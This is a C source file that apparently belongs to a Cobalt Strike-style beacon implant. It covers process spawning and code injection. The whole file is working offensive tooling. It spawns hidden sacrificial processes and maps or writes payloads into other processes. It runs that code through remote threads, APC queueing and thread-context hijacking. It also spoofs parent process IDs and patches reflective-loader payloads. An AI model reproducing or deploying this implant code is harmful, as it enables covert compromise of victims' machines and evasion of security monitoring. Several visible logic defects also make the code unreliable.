#include "pch.h"

#include "spawn.h"

#include <tlhelp32.h>
#include <winternl.h>

#include "beacon.h"
#include "settings.h"


#include "argument.h"
#include "beacon.h"
#include "identity.h"
#include "utils.h"

int gParentPid;

void Spawn(char* data, int size, BOOL x86, BOOL ignoreToken)
{
	IdentityConditionalRevert(ignoreToken);

	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi = { 0 };

	/* get the startup information of the current process */
	GetStartupInfoA(&si);

	// Indicate the attributes of the process to be created.
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // means: use the following handles and show the window
	si.wShowWindow = SW_HIDE; // means: don't show the window

	// clear the standard input
	memset(&si.hStdInput, 0, sizeof(si.hStdInput));

	// Spawn a temporary process.
	if (BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi))
	{
		Sleep(100);

		// Inject the payload into the spawned process using InjectProcess.
		BeaconInjectTemporaryProcess(&pi, data, size, 0, NULL, 0);

		BeaconCleanupProcess(&pi);
	}

	IdentityConditionalImpersonate(ignoreToken);
}

void SpawnAndPing(char* data, int size, BOOL x86)
{
	datap parser;
	BeaconDataParse(&parser, data, size);
	short port = BeaconDataShort(&parser);
	CHAR* spawnData = BeaconDataBuffer(&parser);
	SIZE_T spawnSize = BeaconDataLength(&parser);

	Spawn(spawnData, spawnSize, x86, TRUE);

	port = htons(port);
	BeaconOutput(CALLBACK_PING, (char*)&port, sizeof(port));
}

char* gSpawnToX86 = NULL;
char* gSpawnToX64 = NULL;
DWORD SpawnToExpand(char* expanded, size_t size, BOOL x86)
{
	char lBuffer[256] = { 0 };

	char* spawnTo;
	if (x86)
	{
		if (gSpawnToX86 == NULL || strlen(gSpawnToX86) == 0)
		{
			spawnTo = S_SPAWNTO_X86;
		}
		else
		{
			LERROR("gSpawnToX86 is not NULL or empty");
		}
	}
	else
	{
		if (gSpawnToX64 == NULL || strlen(gSpawnToX64) == 0)
		{
			spawnTo = S_SPAWNTO_X64;
		}
		else
		{
			LERROR("gSpawnToX64 is not NULL or empty");
		}
	}

	snprintf(lBuffer, sizeof(lBuffer), "%s", spawnTo);
	return ExpandEnvironmentStrings_s(lBuffer, expanded, size);
}

#define MAX_CMD 256
void SpawnToFix(BOOL x86, char* cmd)
{
	memset(cmd, 0, MAX_CMD);
	SpawnToExpand(cmd, MAX_CMD, x86);

	if (!x86)
	{
		// look for the substring "sysnative" in cmd
		char* substr = strstr(cmd, "sysnative");
		if (!substr)
			return;

		char aux[MAX_CMD] = { 0 };
		memcpy(substr, "system32", STRLEN("system32"));

		// copy the rest of the string
		char* after = substr + STRLEN("sysnative");
		int afterLength = strlen(after);
		memcpy(aux, after, afterLength);

		memcpy(substr + STRLEN("system32"), aux, strlen(aux) + 1);
	}
}

/**
 * @brief Gets the spawn path based on the architecture.
 *
 * This function retrieves the spawn path depending on the architecture (x86 or x64).
 * The result is stored in the provided buffer after expanding any environment variables.
 *
 * @param x86 Flag indicating whether the architecture is x86 (TRUE) or x64 (FALSE).
 * @param buffer A pointer to the buffer where the spawn path will be stored.
 * @param length The size of the buffer in bytes.
 */
void BeaconGetSpawnTo(BOOL x86, char* buffer, int length)
{
	char cmd[MAX_CMD];
	SpawnToFix(x86, cmd);

	int size = min(length, MAX_CMD);
	memcpy(buffer, cmd, size);
}

typedef struct _INJECTION
{
	DWORD pid;
	HANDLE process;
	BOOL isX64;
	BOOL isProcessX64;
	BOOL isSameArchAsHostSystem;
	BOOL isSamePid;
	BOOL isTemporary;
	HANDLE thread;
} INJECTION;

;
typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_ISWOW64PROCESS)(_In_ HANDLE hProcess, _Out_ PBOOL Wow64Process);
typedef WINBASEAPI HMODULE(WINAPI* FN_KERNEL32_LOADLIBRARYA)(_In_ LPCSTR lpLibFileName);
typedef WINBASEAPI FARPROC(WINAPI* FN_KERNEL32_GETPROCADDRESS)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
typedef WINBASEAPI LPVOID(WINAPI* FN_KERNEL32_VIRTUALALLOC)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_VIRTUALPROTECT)(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);

typedef CLIENT_ID* PCLIENT_ID;
typedef NTSTATUS(NTAPI* FN_NTDLL_RTLCREATEUSERTHREAD)(_In_ HANDLE ProcessHandle, _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor, _In_ BOOLEAN CreateSuspended, _In_opt_ ULONG StackZeroBits, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit, _In_ PVOID StartAddress, _In_opt_ PVOID Parameter, _Out_opt_ PHANDLE ThreadHandle, _Out_opt_ PCLIENT_ID ClientId);
typedef NTSTATUS(NTAPI* FN_NTDLL_NTQUEUEAPCTHREAD)(_In_ HANDLE ThreadHandle, _In_ PVOID ApcRoutine, _In_ PVOID ApcRoutineContext OPTIONAL, _In_ PVOID ApcStatusBlock OPTIONAL, _In_ PVOID ApcReserved OPTIONAL);

typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;
typedef NTSTATUS(NTAPI* FN_NTDLL_NTMAPVIEWOFSECTION)(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize, _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize, _In_ SECTION_INHERIT InheritDisposition, _In_ ULONG AllocationType, _In_ ULONG Win32Protect);

BOOL IsWow64ProcessEx(HANDLE hProcess)
{
	HMODULE hModule = GetModuleHandleA("kernel32");
	FN_KERNEL32_ISWOW64PROCESS _IsWow64Process = (FN_KERNEL32_ISWOW64PROCESS)GetProcAddress(hModule, "IsWow64Process");
	if (_IsWow64Process == NULL)
	{
		LERROR("kernel32$IsWow64Process: IsWow64Process is NULL");
		return FALSE;
	}

	BOOL Wow64Process = FALSE;
	return _IsWow64Process(hProcess, &Wow64Process) && Wow64Process;
}

BOOL IsProcess64Bit(HANDLE hProcess)
{
	if (!IS_X64() && !IsWow64ProcessEx(GetCurrentProcess()))
		return FALSE;

	return !IsWow64ProcessEx(hProcess);
}

typedef struct _PAYLOAD
{
	SHORT mzSignature;
	char _[982];
	FN_KERNEL32_LOADLIBRARYA pLoadLibraryA;
	FN_KERNEL32_GETPROCADDRESS pGetProcAddress;
	FN_KERNEL32_VIRTUALALLOC pVirtualAlloc;
	FN_KERNEL32_VIRTUALPROTECT pVirtualProtect;
	DWORD keyPtrMagic;
	DWORD smartInjectMagic;
} PAYLOAD;


char* InjectViaNtMapViewOfSection(HANDLE handle, DWORD pid, const char* payload, int size)
{
	/* determine the minimum allocation size based on S_PROCINJ_MINALLOC */
	int dwSize = max(S_PROCINJ_MINALLOC, size);

	/* get the handle to the ntdll module */
	HMODULE hModule = GetModuleHandleA("ntdll.dll");

	/* get the address of the NtMapViewOfSection function */
	FN_NTDLL_NTMAPVIEWOFSECTION _NtMapViewOfSection = (FN_NTDLL_NTMAPVIEWOFSECTION)GetProcAddress(hModule, "NtMapViewOfSection");

	/* check if the function was found */
	if (_NtMapViewOfSection == NULL)
		return NULL;

	/* create a file mapping object */
	HANDLE hFileMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL);

	LPVOID lpBaseAddress = NULL;

	/* check if the file mapping object was created */
	if (hFileMapping != INVALID_HANDLE_VALUE)
	{
		// map a view of the file into the process's address space (use MapViewOfFile)
		LPVOID lpFileMap = MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, dwSize);

		// check if the file was mapped
		if (lpFileMap)
		{
			// copy the payload into the mapped file
			memcpy(lpFileMap, payload, size);

			// call NtMapViewOfSection to map the file into the target process

			SIZE_T dwViewSize = 0;
			NTSTATUS status = _NtMapViewOfSection(hFileMapping, handle, &lpBaseAddress, 0, 0, NULL, &dwViewSize, ViewShare, 0, S_PROCINJ_PERMS);

			// unmap the file from the current process
			UnmapViewOfFile(lpFileMap);
		}

		// close the file mapping object
		CloseHandle(hFileMapping);
	}

	if (lpBaseAddress == NULL) {
		const DWORD lastError = GetLastError();
		LERROR("Allocate section and copy data failed: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ALLOC_SECTION_FAILED, lastError);
		return NULL;
	}

	return (char*)lpBaseAddress;
}

char* InjectViaVirtualAllocEx(HANDLE hProcess, DWORD pid, const char* payload, int size)
{
	/* determine the minimum allocation size based on S_PROCINJ_MINALLOC */
	int dwSize = max(S_PROCINJ_MINALLOC, size);

	/* allocate memory in the target process */
	LPBYTE lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);

	/* check if the memory was allocated */
	if (lpBaseAddress == NULL)
	{
		const DWORD lastError = GetLastError();
		LERROR("Could not allocate %d bytes in process: %s", dwSize, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError);
		return NULL;
	}

	int wrote = 0;
	for (int total = 0; total < size; total += wrote)
	{
		if (!WriteProcessMemory(hProcess, lpBaseAddress + total, payload + total, size - total, &wrote))
		{
			DWORD lastError = GetLastError();
			LERROR("Could not write to process memory: %s", LAST_ERROR_STR(lastError));
			BeaconErrorD(ERROR_WRITE_TO_PROC_MEMORY_FAILED, lastError);
			VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
			return NULL;
		}
	}

	if (S_PROCINJ_PERMS_I != S_PROCINJ_PERMS)
	{
		DWORD flOldProtect;
		if (!VirtualProtectEx(hProcess, lpBaseAddress, dwSize, S_PROCINJ_PERMS, &flOldProtect))
		{
			DWORD lastError = GetLastError();
			LERROR("Could not adjust permissions in process: %s", LAST_ERROR_STR(lastError));
			BeaconErrorD(ERROR_ADJUST_PERMISSIONS_FAILED, lastError);
			VirtualFree(lpBaseAddress, 0, MEM_RELEASE);
			return NULL;
		}
	}

	return (char*)lpBaseAddress;
}

char* InjectRemotely(INJECTION* injection, const char* payload, int size)
{
	if (S_PROCINJ_ALLOCATOR && injection->isSameArchAsHostSystem)
	{
		return InjectViaNtMapViewOfSection(injection->process, injection->pid, payload, size);
	}
	else
	{
		return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
	}
}

BOOL AdjustMemoryPermissions(char* payload, int size) {
	if (S_PROCINJ_PERMS_I == S_PROCINJ_PERMS)
		return TRUE;

	DWORD flOldProtect;
	if (!VirtualProtect(payload, size, S_PROCINJ_PERMS, &flOldProtect))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust permissions in process: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_PERMISSIONS_FAILED, lastError);
		return FALSE;
	}

	return TRUE;
}

char* InjectLocally(char* payload, int size)
{
	int dwSize = S_PROCINJ_MINALLOC;
	if (size > dwSize)
		dwSize = size + 1024;

	char* pAlloc = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);

	if (!pAlloc)
	{
		DWORD lastError = GetLastError();
		LERROR("Could not allocate %d bytes in process: %s", dwSize, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError);
		return NULL;
	}

	memcpy(pAlloc, payload, size);
	if (AdjustMemoryPermissions(pAlloc, dwSize))
	{
		return pAlloc;
	}

	VirtualFree(pAlloc, 0, MEM_RELEASE);

	return NULL;
}

void InjectIntoPid(char* buffer, int length, BOOL x86)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	int pid = BeaconDataInt(&parser);
	int payloadOffset = BeaconDataInt(&parser);

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
	if (hProcess == NULL)
	{
		int lastError = GetLastError();
		LERROR("Could not open process %d: %s", pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_OPEN_PROCESS_FAILED, pid, lastError);
		return;
	}

	BOOL isProcessX64 = IsProcess64Bit(hProcess);
	if(x86 == isProcessX64)
	{
		int type;
		if (isProcessX64)
		{
			LERROR("%d is a x64 process (can't inject x86 content)", pid);
			type = ERROR_INJECT_X86_INTO_X64;
		} else {
			LERROR("%d is a x86 process (can't inject x64 content)", pid);
			type = ERROR_INJECT_X64_INTO_X86;
		}
		BeaconErrorD(type, pid);
		return;
	}

	int len = BeaconDataLength(&parser);
	char* payload = BeaconDataBuffer(&parser);
	BeaconInjectProcess(hProcess, pid, payload, len, payloadOffset, NULL, 0);
	CloseHandle(hProcess);
}

void InjectIntoPidAndPing(char* buffer, int length, BOOL x86)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);

	int size = BeaconDataLength(&parser);
	char* payload = BeaconDataBuffer(&parser);
	InjectIntoPid(payload, size, x86);

	port = htons(port);
	BeaconOutput(CALLBACK_PING, (char*)&port, sizeof(port));
}

BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
{
	return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
}

BOOL ExecuteViaRtlCreateUserThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
{
	HMODULE hModule = GetModuleHandleA("ntdll.dll");
	FN_NTDLL_RTLCREATEUSERTHREAD _RtlCreateUserThread = (FN_NTDLL_RTLCREATEUSERTHREAD)GetProcAddress(hModule, "RtlCreateUserThread");
	if (_RtlCreateUserThread == NULL)
	{
		LERROR("Cannot find RtlCreateUserThread in ntdll.dll");
		return FALSE;
	}

	CLIENT_ID ClientId;
	HANDLE hThread = NULL;
	_RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpStartAddress, lpParameter, &hThread, &ClientId);
	return hThread != NULL;
}

BOOL ExecuteViaNtQueueApcThread_s(INJECTION* injection, LPVOID lpStartAddress, LPVOID lpParameter)
{
	HMODULE hModule = GetModuleHandleA("ntdll");
	FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, "NtQueueApcThread");

	if (_NtQueueApcThread == NULL)
		return FALSE;

	if (_NtQueueApcThread(injection->thread, lpStartAddress, lpParameter, NULL, NULL) != 0)
		return FALSE;

	return ResumeThread(injection->thread) != -1;
}


//CreateThread typedef
typedef HANDLE(WINAPI* FN_KERNEL32_CREATETHREAD)(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
typedef struct _APC_ROUTINE_CONTEXT
{
	LPVOID lpStartAddress;
	LPVOID lpAddress;
	FN_KERNEL32_CREATETHREAD pCreateThread;
	BOOL isExecuted;
	CHAR payload[];
} APC_ROUTINE_CONTEXT, * PAPC_ROUTINE_CONTEXT;

#if IS_X64()
#define TEB$ActivationContextStack() ((char*)NtCurrentTeb() + 0x2c8)
#else
#define TEB$ActivationContextStack() ((char*)NtCurrentTeb() + 0x1a8)
#endif

#pragma code_seg(push, ".text$KKK000")
__declspec(noinline) void NtQueueApcThreadProc(PAPC_ROUTINE_CONTEXT pData)
{
	if (pData->isExecuted)
		return;

	if (!(TEB$ActivationContextStack()))
		return;

	pData->isExecuted = TRUE;
	pData->pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pData->lpStartAddress, pData->lpAddress, 0, NULL);
}
#pragma code_seg(pop)

#pragma code_seg(push, ".text$KKK001")
__declspec(noinline) void NtQueueApcThreadProc_End(void) {}
#pragma code_seg(pop)

BOOL ExecuteViaNtQueueApcThread(INJECTION* injection, LPVOID lpStartAddress, LPVOID lpParameter)
{
	HMODULE hModule = GetModuleHandleA("ntdll");
	FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, "NtQueueApcThread");

	SIZE_T payloadSize = (DWORD64)NtQueueApcThreadProc_End - (DWORD64)NtQueueApcThreadProc;
	SIZE_T dwSize = sizeof(APC_ROUTINE_CONTEXT) + payloadSize;
	PAPC_ROUTINE_CONTEXT pAllocedData = malloc(dwSize);
	if (!pAllocedData)
		return FALSE;

	APC_ROUTINE_CONTEXT data = (APC_ROUTINE_CONTEXT){ lpStartAddress, lpParameter, CreateThread, FALSE };
	*pAllocedData = data;
	memcpy(pAllocedData->payload, (PVOID)NtQueueApcThreadProc, payloadSize);
	APC_ROUTINE_CONTEXT* lpApcContext = VirtualAllocEx(injection->process, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	SIZE_T wrote;
	if (lpApcContext && WriteProcessMemory(injection->process, lpApcContext, pAllocedData, dwSize, &wrote) && wrote != dwSize)
		lpApcContext = NULL;

	free(pAllocedData);

	if ((char*)lpApcContext == NULL)
		return FALSE;

	// Create a toolhelp snapshot of the process
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	// Check if snapshot creation failed or there are no threads in the process
	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
	if (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == NULL || !Thread32First(hSnapshot, &te32))
		return FALSE;

	// Iterate through the threads in the snapshot
	do
	{
		// Check if the thread is in the process we want to inject into
		if (te32.th32OwnerProcessID != injection->pid)
			continue;

		// Open the thread
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
		if (hThread == NULL)
			continue;

		// Call the NtQueueApcThread function in the target process
		(_NtQueueApcThread)(hThread, lpApcContext->payload, lpApcContext, NULL, NULL);

		// Close the thread
		CloseHandle(hThread);
	} while (Thread32Next(hSnapshot, &te32));

	// Close the snapshot handle
	CloseHandle(hSnapshot);

	// Sleep to give the thread time to execute
	Sleep(200);

	// Read the APC thread data from the allocated memory
	SIZE_T read;
	if (!ReadProcessMemory(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT), &read) || read != sizeof(APC_ROUTINE_CONTEXT))
		return FALSE;

	// Return TRUE if the thread was executed
	if (data.isExecuted)
		return TRUE;

	// Mark the thread as executed and write it back to the allocated memory
	data.isExecuted = TRUE;
	WriteProcessMemory(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT), &read);
	return FALSE;
}

#define METHOD_CREATE_THREAD 1
#define METHOD_SET_THREAD_CONTEXT 2
#define METHOD_CREATE_REMOTE_THREAD 3
#define METHOD_RTL_CREATE_USER_THREAD 4
#define METHOD_NT_QUEUE_APC_THREAD 5
#define METHOD_CREATE_THREAD_S 6
#define METHOD_CREATE_REMOTE_THREAD_S 7
#define METHOD_NT_QUEUE_APC_THREAD_S 8

BOOL ExecuteViaCreateRemoteThread_s(DWORD option, HANDLE hProcess, LPVOID lpAddress, LPVOID lpParameter, LPCSTR lpModuleName, LPCSTR lpProcName, DWORD ordinal)
{
	HANDLE hModule = GetModuleHandleA(lpModuleName);
	BYTE* processAddress = (BYTE*)GetProcAddress(hModule, lpProcName);
	if (!processAddress)
		return FALSE;

	BYTE* finalAddress = processAddress + ordinal;
	HANDLE hThread;
	if (option == METHOD_CREATE_REMOTE_THREAD_S)
	{
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL);
	}
	else if (option == METHOD_CREATE_THREAD_S)
	{
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL);
	}
	else
	{
		return FALSE;
	}

	if (!hThread)
		return FALSE;

	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, &context))
		return FALSE;

#if IS_X64()
	context.Rcx = (DWORD64)lpAddress;
#else
	context.Eax = (DWORD)lpAddress;
#endif

	if (!SetThreadContext(hThread, &context))
		return FALSE;

	return ResumeThread(hThread) != -1;
}

BOOL ExecuteViaSetThreadContext(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter)
{
	HANDLE hThread = injection->thread;

#if IS_X64()		
	if (!injection->isProcessX64)
	{
		WOW64_CONTEXT context;
		context.ContextFlags = CONTEXT_INTEGER;

		if (!Wow64GetThreadContext(hThread, &context))
			return FALSE;

		context.Eax = (DWORD)lpStartAddress;

		if (!Wow64SetThreadContext(hThread, &context))
			return FALSE;
	}
	else
#endif
	{
		CONTEXT context;
		context.ContextFlags = CONTEXT_INTEGER;

		if (!GetThreadContext(hThread, &context))
			return FALSE;

#if IS_X64()
		context.Rcx = (DWORD64)lpStartAddress;
		context.Rdx = (DWORD64)lpParameter;
#else
		context.Eax = (DWORD)lpStartAddress;
#endif

		if (!SetThreadContext(hThread, &context))
			return FALSE;
	}

	return ResumeThread(hThread) != -1;
}

BOOL ExecuteViaCreateThread(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter)
{
	return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
}

BOOL ExecuteInjection(INJECTION* injection, CHAR* lpStartAddress, DWORD offset, LPVOID lpParameter)
{
	datap parser;
	BeaconDataParse(&parser, S_PROCINJ_EXECUTE, 128);

	SHORT ordinal; CHAR* lpModuleName; CHAR* lpProcName;
	while (char method = BeaconDataByte(&parser))
	{
		switch (method)
		{
		case METHOD_CREATE_REMOTE_THREAD:
			if (ExecuteViaCreateRemoteThread(injection->process, lpStartAddress + offset, lpParameter))
				return TRUE;

			break;
		case METHOD_RTL_CREATE_USER_THREAD:
			if (ExecuteViaRtlCreateUserThread(injection->process, lpStartAddress + offset, lpParameter))
				return TRUE;

			break;
		case METHOD_NT_QUEUE_APC_THREAD_S:
			if (!injection->isTemporary || !injection->isSameArchAsHostSystem)
				continue;

			if (ExecuteViaNtQueueApcThread_s(injection, lpStartAddress + offset, lpParameter))
				return TRUE;

			break;
		case METHOD_CREATE_REMOTE_THREAD_S:
			ordinal = BeaconDataShort(&parser);
			lpModuleName = BeaconDataStringPointer(&parser);
			lpProcName = BeaconDataStringPointer(&parser);

			if (!injection->isSameArchAsHostSystem)
				continue;

			if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_REMOTE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal))
				return TRUE;

			break;
		case METHOD_CREATE_THREAD_S:
			ordinal = BeaconDataShort(&parser);
			lpModuleName = BeaconDataStringPointer(&parser);
			lpProcName = BeaconDataStringPointer(&parser);

			if (!injection->isSamePid)
				continue;

			if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal))
				return TRUE;

			break;
		case METHOD_NT_QUEUE_APC_THREAD:
			if (injection->isSamePid || !injection->isSameArchAsHostSystem || injection->isTemporary)
				continue;

			if (ExecuteViaNtQueueApcThread(injection, lpStartAddress + offset, lpParameter))
				return TRUE;

			break;
		case METHOD_SET_THREAD_CONTEXT:
			if (!injection->isTemporary)
				continue;

			if (ExecuteViaSetThreadContext(injection, lpStartAddress + offset, lpParameter))
				return TRUE;

			break;
		case METHOD_CREATE_THREAD:
			if (!injection->isSamePid)
				continue;

			if (ExecuteViaCreateThread(injection, lpStartAddress + offset, lpParameter))
				return TRUE;

			break;
		default:
			return FALSE;
		}
	}
}

void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
{
	char* target;
	if (injection->isSamePid)
		target = InjectLocally(payload, size);
	else
		target = InjectRemotely(injection, payload, size);

	if (!target)
		return;

	if (!ExecuteInjection(injection, target, pOffset, parameter))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not create remote thread in %d: %s", injection->pid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_CREATE_REMOTE_THREAD_FAILED, injection->pid, lastError);
	}
}

#define REFLECTIVE_LOADER_SIZE 51200
void BeaconInjectProcessInternal(PROCESS_INFORMATION* processInfo, HANDLE hProcess, int pid, char* payload, int pLen,
	int pOffset, char* str, int aLen)
{
	INJECTION injection;
	injection.pid = pid;
	injection.process = hProcess;
	injection.isX64 = IS_X64();
	injection.isProcessX64 = IsProcess64Bit(hProcess);
	injection.isSameArchAsHostSystem = injection.isProcessX64 == IS_X64();
	injection.isSamePid = pid == GetCurrentProcessId();
	injection.isTemporary = processInfo != NULL;
	injection.thread = injection.isTemporary ? processInfo->hThread : NULL;

	PAYLOAD* maskedPayload = (PAYLOAD*)payload;
	if (pLen >= REFLECTIVE_LOADER_SIZE && maskedPayload->mzSignature == IMAGE_DOS_SIGNATURE && maskedPayload->smartInjectMagic == 0xF4F4F4F4)
	{
		if (injection.isSameArchAsHostSystem)
		{
			maskedPayload->pGetProcAddress = GetProcAddress;
			maskedPayload->pLoadLibraryA = LoadLibraryA;
			maskedPayload->pVirtualAlloc = VirtualAlloc;
			maskedPayload->pVirtualProtect = VirtualProtect;

			maskedPayload->keyPtrMagic = 0xF00D;
		}
	}

	datap parser;
	BeaconDataParse(&parser, IS_X64() ? S_PROCINJ_TRANSFORM_X64 : S_PROCINJ_TRANSFORM_X86, 256);

	int prependSize = BeaconDataInt(&parser);
	char* prepend = BeaconDataPtr(&parser, prependSize);

	int appendSize = BeaconDataInt(&parser);
	char* append = BeaconDataPtr(&parser, appendSize);

	char* parameter;
	if (aLen <= 0)
		parameter = 0;
	else
		parameter = InjectRemotely(&injection, str, aLen);

	if (prependSize || appendSize)
	{
		formatp format;
		BeaconFormatAlloc(&format, prependSize + appendSize + pLen + 16);
		BeaconFormatAppend(&format, prepend, prependSize);
		BeaconFormatAppend(&format, payload, pLen);
		BeaconFormatAppend(&format, append, appendSize);

		pOffset += prependSize;

		pLen = BeaconFormatLength(&format);
		payload = BeaconFormatOriginal(&format);

		InjectAndExecute(&injection, payload, pLen, pOffset, parameter);
		BeaconFormatFree(&format);
	}
	else
	{
		InjectAndExecute(&injection, payload, pLen, pOffset, parameter);
	}
}

BOOL gBlockDlls;

void BlockDlls(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	gBlockDlls = BeaconDataInt(&parser) != 0;
}

LPPROC_THREAD_ATTRIBUTE_LIST ProcThreadAttributeListInit(DWORD dwAttributeCount)
{
	// Initialize the process attribute list
	SIZE_T size = 0;
	InitializeProcThreadAttributeList(NULL, dwAttributeCount, 0, &size);
	HANDLE processHeap = GetProcessHeap();
	LPVOID attributeList = HeapAlloc(processHeap, 0, size);
	if (attributeList == NULL)
		return FALSE;

	if (!InitializeProcThreadAttributeList(attributeList, dwAttributeCount, 0, &size))
		return FALSE;

	return attributeList;
}
typedef struct _RUN_UNDER_CONTEXT {
	HANDLE handle;
	ULONG64 processAttribute;
	UINT previousErrorMode;
	BOOL(WINAPI* updateProcessAttributes)(struct _RUN_UNDER_CONTEXT*, DWORD, LPPROC_THREAD_ATTRIBUTE_LIST, STARTUPINFO*);
	VOID(WINAPI* cleanup)(const struct _RUN_UNDER_CONTEXT*);
} RUN_UNDER_CONTEXT, * PRUN_UNDER_CONTEXT;
BOOL UpdateParentProcessContext(PRUN_UNDER_CONTEXT context, DWORD parentPid, LPPROC_THREAD_ATTRIBUTE_LIST attributeList, STARTUPINFO* si)
{
	// Open the parent process with full access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);
	if (hProcess == NULL)
	{
		DWORD lastError = GetLastError();
		LERROR("Could not set PID to %d: %s", parentPid, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_SET_PID_FAILED, parentPid, lastError);
		return FALSE;
	}

	// Store the handle to the parent process
	context->handle = hProcess;

	// Update the process attribute list
	if (!UpdateProcThreadAttribute(attributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not update process attribute: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_UPDATE_PROC_THREAD_ATTRIBUTE_LIST_FAILED, lastError);
		return FALSE;
	}

	if (si->hStdOutput && si->hStdError && si->hStdOutput == si->hStdError)
	{
		DuplicateHandle(GetCurrentProcess(), si->hStdOutput, hProcess, &si->hStdOutput, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
		si->hStdError = si->hStdOutput;
	}
	else
	{
		if (si->hStdOutput)
		{
			DuplicateHandle(GetCurrentProcess(), si->hStdOutput, hProcess, &si->hStdOutput, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
		}

		if (si->hStdError)
		{
			DuplicateHandle(GetCurrentProcess(), si->hStdError, hProcess, &si->hStdError, 0, TRUE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE);
		}
	}

	return TRUE;
}
void CleanupParentProcessContext(PRUN_UNDER_CONTEXT context)
{
	CloseHandle(context->handle);
}
